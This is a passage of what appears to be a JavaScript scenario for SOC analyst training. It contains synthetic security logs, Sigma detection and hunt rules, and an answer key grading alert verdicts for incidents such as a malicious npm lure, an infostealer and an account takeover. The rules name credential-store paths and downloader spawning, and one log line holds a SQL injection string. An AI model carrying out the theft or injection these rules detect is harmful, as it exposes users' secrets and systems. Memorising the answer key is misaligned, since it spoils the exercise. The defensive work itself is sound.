    {"_src":"waf","_t":"2026-11-05T03:09:12Z","ClientIP":"198.51.100.77","ClientRequestHost":"app.kestrel.example","ClientRequestMethod":"POST","ClientRequestPath":"/api/v1/auth/login","ClientRequestUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36","ClientASN":"AS64501 (synthetic residential proxy pool)","ClientCountry":"ID","SecurityAction":"log","SecurityRuleDescription":"Login rate limit: 20 req/min per IP","EdgeResponseStatus":200,"RequestCount":1,"CustomerId":"cust-58812","LeakedCredentialCheck":"password_seen_in_breach","Datetime":"2026-11-05T03:09:12Z"},
    {"_src":"waf","_t":"2026-11-05T03:10:40Z","ClientIP":"198.51.100.77","ClientRequestHost":"app.kestrel.example","ClientRequestMethod":"GET","ClientRequestPath":"/api/v1/withdrawals/addresses","ClientRequestUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36","ClientASN":"AS64501 (synthetic residential proxy pool)","ClientCountry":"ID","SecurityAction":"allow","SecurityRuleDescription":"","EdgeResponseStatus":200,"RequestCount":1,"CustomerId":"cust-58812","Datetime":"2026-11-05T03:10:40Z"},
    {"_src":"waf","_t":"2026-11-05T03:11:05Z","ClientIP":"198.51.100.77","ClientRequestHost":"app.kestrel.example","ClientRequestMethod":"POST","ClientRequestPath":"/api/v1/withdrawals/whitelist","ClientRequestUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36","ClientASN":"AS64501 (synthetic residential proxy pool)","ClientCountry":"ID","SecurityAction":"allow","SecurityRuleDescription":"","EdgeResponseStatus":200,"RequestCount":1,"CustomerId":"cust-58812","Body":"{\"address\":\"TXs...synthetic\",\"network\":\"TRON\"}","Datetime":"2026-11-05T03:11:05Z"},
    {"_src":"edr","_t":"2026-11-05T03:31:00Z","FileName":"EXCEL.EXE","FolderPath":"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE","ProcessCommandLine":"EXCEL.EXE /dde","InitiatingProcessFileName":"explorer.exe","Timestamp":"2026-11-05T03:31:00","DeviceName":"LIS-WIN-0087","AccountName":"j.okafor","ActionType":"ProcessCreated"},
    {"_src":"idp","_t":"2026-11-05T04:10:33Z","target":[{"displayName":"AWS IAM Identity Center"}],"authenticationContext":{"externalSessionId":"idx-lc-7720"},"client":{"userAgent":{"rawUserAgent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/128.0"},"geographicalContext":{"country":"US"},"ipAddress":"45.32.101.18"},"published":"2026-11-05T04:10:33Z","eventType":"user.authentication.sso","actor":{"alternateId":"l.chen@kestrel.example","type":"User"},"securityContext":{"asOrg":"The Constant Company, LLC","isProxy":false},"outcome":{"result":"SUCCESS","reason":null}},
    {"_src":"idp","_t":"2026-11-05T04:11:02Z","target":[{"displayName":"Grafana"}],"authenticationContext":{"externalSessionId":"idx-lc-7720"},"client":{"userAgent":{"rawUserAgent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/128.0"},"geographicalContext":{"country":"US"},"ipAddress":"45.32.101.18"},"published":"2026-11-05T04:11:02Z","eventType":"user.authentication.sso","actor":{"alternateId":"l.chen@kestrel.example","type":"User"},"securityContext":{"asOrg":"The Constant Company, LLC","isProxy":false},"outcome":{"result":"SUCCESS","reason":null}},
    {"_src":"idp","_t":"2026-11-05T04:12:47Z","published":"2026-11-05T04:12:47Z","eventType":"user.account.update_password","actor":{"alternateId":"l.chen@kestrel.example","type":"User"},"client":{"ipAddress":"100.64.20.8"},"securityContext":{"asOrg":"AS9506 Singtel","isProxy":false},"outcome":{"result":"SUCCESS","reason":null}},
    {"_src":"sse","_t":"2026-11-05T04:40:10Z","url":"translate.google.com","urlcategory":"Web Search","action":"Allowed","appname":"Google Translate","bytes_out":1200,"datetime":"2026-11-05T04:40:10","user":"p.nguyen@kestrel.example"},
    {"_src":"sse","_t":"2026-11-05T05:02:33Z","url":"portal.azure.com","urlcategory":"Professional Services","action":"Allowed","appname":"Azure Portal","bytes_out":3300,"datetime":"2026-11-05T05:02:33","user":"m.silva@kestrel.example"},
    {"_src":"idp","_t":"2026-11-05T05:30:20Z","target":[{"displayName":"Intune"}],"authenticationContext":{"externalSessionId":"idx-ms-3301"},"published":"2026-11-05T05:30:20Z","eventType":"user.authentication.sso","actor":{"alternateId":"m.silva@kestrel.example","type":"User"},"client":{"ipAddress":"100.64.10.50"},"securityContext":{"asOrg":"AS3243 MEO","isProxy":false},"outcome":{"result":"SUCCESS","reason":null}},
    {"_src":"waf","_t":"2026-11-05T05:31:44Z","ClientIP":"198.51.100.203","ClientRequestHost":"app.kestrel.example","ClientRequestMethod":"GET","ClientRequestPath":"/api/v1/assets?id=1%20UNION%20SELECT%20NULL--","ClientRequestUserAgent":"sqlmap/1.8.4#stable (https://sqlmap.org)","ClientASN":"AS64500 (synthetic hosting)","ClientCountry":"DE","SecurityAction":"block","SecurityRuleDescription":"SQLi: tautology or UNION in query","EdgeResponseStatus":403,"RequestCount":38,"Datetime":"2026-11-05T05:31:44Z"},
    {"_src":"sse","_t":"2026-11-05T06:15:22Z","url":"drive.google.com/upload/drive/v3/files?uploadType=resumable","urlcategory":"Online Storage","action":"Allowed","appname":"Google Drive (personal instance)","bytes_out":4823100,"filename":"Q3_reserve_attestation_draft.xlsx","dlpengine":"Financial: Confidential label","dlpdict":"Kestrel Confidential","tenant":"personal","datetime":"2026-11-05T06:15:22","user":"j.okafor@kestrel.example"},
    {"_src":"cloud","_t":"2026-11-05T07:12:44Z","eventSource":"sts.amazonaws.com","eventTime":"2026-11-05T07:12:44","eventName":"AssumeRole","userIdentity":{"type":"IAMUser","userName":"svc-ci","accessKeyId":"AKIAEXAMPLE7QXD","arn":"arn:aws:iam::111122223333:user/svc-ci"},"sourceIPAddress":"100.64.20.30","userAgent":"aws-sdk-go-v2/1.30.3 os/linux","awsRegion":"ap-southeast-1","recipientAccountId":"111122223333"},
    {"_src":"waf","_t":"2026-11-05T08:20:00Z","ClientIP":"100.64.10.21","ClientRequestHost":"app.kestrel.example","ClientRequestMethod":"GET","ClientRequestPath":"/status","ClientRequestUserAgent":"uptime-check/1.0","ClientASN":"internal","ClientCountry":"MY","SecurityAction":"allow","SecurityRuleDescription":"","EdgeResponseStatus":200,"RequestCount":1,"Datetime":"2026-11-05T08:20:00Z"}
    ],

    /* single-event detections: Sigma YAML, run with sigma.js */
    rules: [
      { id: "R-EDR-001", platform: "EDR", yaml: `
title: Node or npm spawns a downloader or interpreter
id: 7c1d0b6e-1a2b-4c9e-9a31-000000000001
status: test
description: A package install script (postinstall) or a node process launches curl, wget or python. Common in malicious npm packages used in fake job-interview lures.
logsource: { product: edr, category: process_creation }
detection:
  selection:
    ActionType: ProcessCreated
    InitiatingProcessFileName: [node, npm, npx]
    FileName: [curl, wget, python3, python, sh, bash]
  filter_build:
    ProcessCommandLine|contains: [node-gyp, prebuild-install, 'registry.npmjs.org']
  condition: selection and not filter_build
falsepositives:
  - Native module builds (node-gyp) and prebuilt binary fetches
level: high
tags: [attack.execution, attack.t1059.007, attack.command-and-control, attack.t1105]` },
      { id: "R-EDR-002", platform: "EDR", yaml: `
title: Non-browser process reads browser credential or wallet storage
id: 7c1d0b6e-1a2b-4c9e-9a31-000000000002
status: stable
description: Something other than the browser opens Chrome cookies, saved logins, or a wallet extension's storage. Infostealer behaviour.
logsource: { product: edr, category: file_access }
detection:
  selection:
    ActionType: FileRead
    TargetFilePath|contains: ['\\Network\\Cookies', '\\Login Data', 'Local Extension Settings', 'login.keychain-db']
  filter_browser:
    InitiatingProcessFileName: [chrome.exe, msedge.exe, 'Google Chrome', 'Google Chrome Helper']
  condition: selection and not filter_browser
falsepositives:
  - Password manager importers, backup agents
level: high
tags: [attack.credential-access, attack.t1555.003, attack.t1539]` },
      { id: "R-EDR-003", platform: "EDR", tuningNote: "# review in 30 days", yaml: `
title: PowerShell with an encoded command
id: 7c1d0b6e-1a2b-4c9e-9a31-000000000003
status: stable
description: powershell.exe launched with -EncodedCommand.
logsource: { product: edr, category: process_creation }
detection:
  selection:
    FileName: powershell.exe
    ProcessCommandLine|contains: [' -EncodedCommand ', ' -enc ', ' -ec ']
  condition: selection
falsepositives:
  - Device management agents (Intune, SCCM) run encoded remediation scripts
level: medium
tags: [attack.execution, attack.t1059.001, attack.stealth, attack.t1027.010]` },
      { id: "R-EDR-004", platform: "EDR", yaml: `
title: Outbound connection to a raw IP on a non-standard port
id: 7c1d0b6e-1a2b-4c9e-9a31-000000000004
status: test
description: Workstation process talks to an IP literal on a port outside 80/443/53.
logsource: { product: edr, category: network_connection }
detection:
  selection:
    ActionType: ConnectionSuccess
    RemoteUrl: ''
  filter_ports:
    RemotePort: [80, 443, 53, 123]
  filter_private:
    RemoteIP|cidr: ['10.0.0.0/8', '100.64.0.0/10', '192.168.0.0/16', '172.16.0.0/12']
  condition: selection and not filter_ports and not filter_private
falsepositives:
  - Developer tools talking to test servers
level: medium
tags: [attack.command-and-control, attack.t1571]` },
      { id: "R-SSE-001", platform: "SSE", yaml: `
title: Confidential file uploaded to a personal cloud storage instance
id: 7c1d0b6e-1a2b-4c9e-9a31-000000000005
status: stable
description: SSE DLP flags a labelled file going to a personal (non-corporate) tenant.
logsource: { product: sse, category: proxy }
detection:
  selection:
    urlcategory: Online Storage
    tenant: personal
    dlpengine|exists: true
  condition: selection
falsepositives:
  - Approved exceptions for external auditors
level: high
tags: [attack.exfiltration, attack.t1567.002]` },
      { id: "R-WAF-001", platform: "WAF", tuningNote: "# scoped to CHG-2291: remove after the change window, review 2026-12-05", yaml: `
title: WAF blocked injection or traversal attempt
id: 7c1d0b6e-1a2b-4c9e-9a31-000000000006
status: stable
description: Managed rules blocked SQLi, XSS or path traversal against a Kestrel host.
logsource: { product: waf, category: firewall }
detection:
  selection:
    SecurityAction: block
    SecurityRuleDescription|startswith: ['SQLi', 'XSS', 'Path traversal']
  condition: selection
falsepositives:
  - Authorised vulnerability scans
level: medium
tags: [attack.initial-access, attack.t1190, attack.reconnaissance, attack.t1595.002]` },
      { id: "R-IDP-001", platform: "SIEM", yaml: `
title: Okta Verify push rejected by user
id: 7c1d0b6e-1a2b-4c9e-9a31-000000000007
status: stable
description: The user denied an MFA push. Repeated denials suggest push fatigue with a valid password.
logsource: { product: okta, service: okta }
detection:
  selection:
    eventType: user.authentication.auth_via_mfa
    outcome.result: FAILURE
    outcome.reason|contains: rejected
  condition: selection
falsepositives:
  - User mis-tapped
level: medium
tags: [attack.credential-access, attack.t1621]` }
    ],

    /* multi-event detections Sigma single-event rules cannot express. Each picks a built-in type (see docs/SCENARIOS.md). */
    correlations: [
      { id: "C-WAF-001", platform: "WAF", type: "burst_then_success", title: "Credential stuffing burst then successful login from the same pool", level: "high", attack: ["T1110.004", "T1078"],
        description: "Many login POSTs across many IPs and usernames in one ASN within 15 minutes, followed by a 200 from that ASN. Then a withdrawal-address change on the same customer.",
        falsepositives: ["Shared NAT for a large customer office"],
        select: `
detection:
  selection:
    ClientRequestMethod: POST
    ClientRequestPath|endswith: /auth/login
  condition: selection`,
        groupBy: "ClientASN", sourceField: "ClientIP", countField: "DistinctUsernames",
        success: { field: "EdgeResponseStatus", equals: 200 }, subjectField: "CustomerId",
        minSources: 5, minCount: 500, windowMinutes: 15,
        labels: { sources: "source IPs in", count: "distinct usernames tried", followOn: "follow-on requests on the same customer" } },
      { id: "C-IDP-001", platform: "SIEM", type: "same_key_many_values", title: "Same IdP session used from two networks", level: "high", attack: ["T1550.004", "T1539"],
        description: "One externalSessionId seen from the user's usual ASN and from a hosting provider. Session cookie replay, typical after an infostealer.",
        falsepositives: ["User on a corporate VPN that egresses from a cloud region"],
        select: `
detection:
  selection:
    authenticationContext.externalSessionId|exists: true
  condition: selection`,
        keyField: "authenticationContext.externalSessionId", valueField: "securityContext.asOrg", subjectField: "actor.alternateId",
        minValues: 2, includeEarlier: true,
        labels: { key: "session", events: "SSO events on that session" } }
    ],

    /* hunts: Sigma queries over the whole lake, for what no alert covered */
    hunts: [
      { id: "H-01", title: "Cloud API calls by human IAM users from outside corporate egress", why: "Stolen developer keys get used from VPSs. No alert covers CloudTrail today.", yaml: `
title: Human IAM user API call from outside corporate egress
logsource: { product: aws, service: cloudtrail }
detection:
  selection:
    userIdentity.type: IAMUser
  filter_corp:
    sourceIPAddress|cidr: ['100.64.10.0/24', '100.64.20.0/24']
  filter_svc:
    userIdentity.userName|startswith: svc-
  condition: selection and not filter_corp and not filter_svc
level: high
tags: [attack.initial-access, attack.t1078.004, attack.discovery, attack.t1580, attack.t1619]` },
      { id: "H-02", title: "IdP sign-ins from hosting providers", why: "Residential users rarely sign in from a datacentre ASN.", yaml: `
title: Okta sign-in from a hosting provider
logsource: { product: okta, service: okta }
detection:
  selection:
    eventType|startswith: user.authentication
    securityContext.asOrg|contains: [Constant Company, DigitalOcean, OVH, Hetzner, Linode, Amazon, hosting]
  condition: selection
level: medium
tags: [attack.initial-access, attack.t1078]` },
      { id: "H-03", title: "Unsigned binaries run from Downloads", why: "Cracked installers are the usual infostealer delivery.", yaml: `
title: Unsigned executable from a Downloads folder
logsource: { product: edr, category: process_creation }
detection:
  selection:
    ActionType: ProcessCreated
    FolderPath|contains: ['\\Downloads\\', '/Downloads/']
    Signer: unsigned
  condition: selection
level: medium
tags: [attack.execution, attack.t1204.002]` },
      { id: "H-04", title: "Any traffic to port 1224 or 1244", why: "Ports publicly reported for BeaverTail / InvisibleFerret C2.", yaml: `
title: Traffic to ports reported for BeaverTail C2
logsource: { category: network_connection }
detection:
  edr:
    RemotePort: [1224, 1244]
  sse:
    dst_port: [1224, 1244]
  condition: edr or sse
level: high
tags: [attack.command-and-control, attack.t1571]` }
    ],

    /* answer key: what a good shift concludes. Keys are alert ids: "<rule id>|<group key>". */
    answers: {
      "R-EDR-001|KL-MBP-0142": { verdict: "tp", sev: "critical", incident: "INC-A", why: "node spawned curl to a raw IP on 1224 straight after npm install of a take-home repo. ethersscan-api is OSV MAL-2024-8847 (BeaverTail)." },
      "R-EDR-002|KL-MBP-0142": { verdict: "tp", sev: "critical", incident: "INC-A", why: "node read MetaMask's extension storage and the login keychain; python read ~/.aws/credentials. Treat every secret on the laptop as stolen." },
      "R-EDR-004|KL-MBP-0142": { verdict: "tp", sev: "critical", incident: "INC-A", why: "2.4 MB sent to 203.0.113.47:1224 by the dropped python. Exfiltration over the C2 channel." },
      "R-EDR-002|SG-WIN-0311": { verdict: "tp", sev: "high", incident: "INC-C", why: "Unsigned cracked installer from Downloads read Chrome cookies and Login Data, then sent 1.8 MB out. Infostealer on a privileged SRE machine." },
      "R-EDR-003|LIS-WIN-0021": { verdict: "benign", sev: "low", why: "Parent is Intune AgentExecutor.exe, signed by Microsoft, same script on two hosts at the same second. Benign true positive: tune by parent path + signer." },
      "R-EDR-003|HCM-WIN-0450": { verdict: "benign", sev: "low", why: "Same Intune remediation as LIS-WIN-0021." },
      "R-SSE-001|j.okafor": { verdict: "escalate", sev: "high", incident: "INC-F", why: "A Confidential reserve file went to a personal Drive. Cannot be closed by SOC alone: needs the user's manager and Data Protection. Hand over with an owner." },
      "R-WAF-001|10.20.0.15": { verdict: "fp", sev: "info", why: "Approved scanner (CHG-2291) inside its Thursday 02:00 to 04:00 UTC window, staging host only. Tune with a scoped exception that expires." },
      "R-WAF-001|198.51.100.203": { verdict: "tp", sev: "low", why: "sqlmap from an external hosting IP against production, all blocked. Real but contained: block the IP, check for any 200s, no incident." },
      "R-IDP-001|j.okafor": { verdict: "tp", sev: "medium", incident: "CASE-1187", why: "The AMER case resurfaced: 192.0.2.66 still holds j.okafor's password. Confirms IT-5521 is not done yet; chase it and keep the case open." },
      "C-WAF-001|cust-58812": { verdict: "tp", sev: "high", incident: "INC-B", why: "Stuffing burst from one proxy pool, then a 200 with a breached password and a new TRON withdrawal address whitelisted within 2 minutes. Account takeover: lock the account, hold withdrawals, tell Fraud and Support." },
      "C-IDP-001|l.chen": { verdict: "tp", sev: "high", incident: "INC-C", why: "Session idx-lc-7720 replayed from a VPS 4 hours after the infostealer ran. The password change at 04:12 does not kill an existing session: revoke all sessions." }
    },
    huntAnswers: {
      "H-01": { expectHits: 4, unalerted: true, note: "Finds the stolen a.rahman key used from 149.28.17.9 at 02:41 (GetCallerIdentity, ListBuckets, a denied GetObject on kestrel-treasury-reports). No alert fired. Joins INC-A and needs the Cloud team to deactivate the key." },
      "H-02": { expectHits: 4, note: "Finds the l.chen session replay from 45.32.101.18 (already covered by C-IDP-001) and the push-fatigue source 192.0.2.66 from CASE-1187. Both hosting-provider sign-ins would have been caught by a single-event rule." },
      "H-03": { expectHits: 1, note: "Finds CapCut_Pro_Setup.exe on SG-WIN-0311: the delivery step of INC-C." },
      "H-04": { expectHits: 3, note: "Finds both the EDR and SSE records for 203.0.113.47:1224. The SSE allowed it because raw-IP non-standard ports are not inspected: a policy gap to raise." }
    },
    /* rules whose answer-key tuning must drop every noisy alert and keep every confirmed one */
    tuningChecks: ["R-WAF-001", "R-EDR-003"],
    goodShift: [
      { id: "INC-A", sev: "critical", text: "Fake take-home test on KL-MBP-0142. Isolate the host, block 203.0.113.47 and the npm package, revoke a.rahman's sessions, deactivate the AWS key (Cloud team), rotate everything on the laptop, notify the IR lead. H-01 shows the key already used from a VPS." },
      { id: "INC-B", sev: "high", text: "Customer account takeover on cust-58812. Lock the account and hold withdrawals (Fraud), block the proxy range on the WAF, check other 200s from AS64501." },
      { id: "INC-C", sev: "high", text: "Infostealer on SG-WIN-0311 then session replay. Isolate, revoke all of l.chen's sessions (the 04:12 password change did not end the stolen one), reimage, review what the session touched in AWS and Grafana." },
      { id: "INC-F", sev: "high", text: "Escalated: reserve file to a personal Drive. Data protection owns it; SOC hands over with the owner set." },
      { id: "CASE-1187", sev: "medium", text: "Carried in: still open until IT-5521 is confirmed." }
    ]
  };

  if (typeof module === "object" && module.exports) module.exports = scenario;
  else (root.SOC_SCENARIOS = root.SOC_SCENARIOS || {})[scenario.id] = scenario;
})(typeof window !== "undefined" ? window : globalThis);
